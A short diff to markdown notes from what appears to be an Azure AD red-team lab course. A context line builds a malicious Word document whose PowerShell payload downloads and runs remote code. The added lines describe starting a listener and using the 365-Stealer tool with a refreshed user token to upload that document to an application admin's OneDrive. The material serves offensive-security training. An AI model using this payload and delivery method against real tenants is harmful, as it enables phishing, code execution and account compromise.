@@ -82,5 +82,8 @@ Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('htt
 Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\student<x>.doc -Destination C:\AzAD\Tools\student<x>.doc
 ```
 
-- next we can start a listener on the student VM
+- Next we can start a listener on the student VM
 - on the studentVM use 365-stealer web console or CLI to upload the doc to OneDrive of the application admin. 
+` python C:\xampp\htdocs\365-Stealer\365-Stealer.py --refresh-user MarkDWalden@defcorphq.onmicorsoft.com --upload C:\AzAD\Tools\student<X>.doc`
+
+
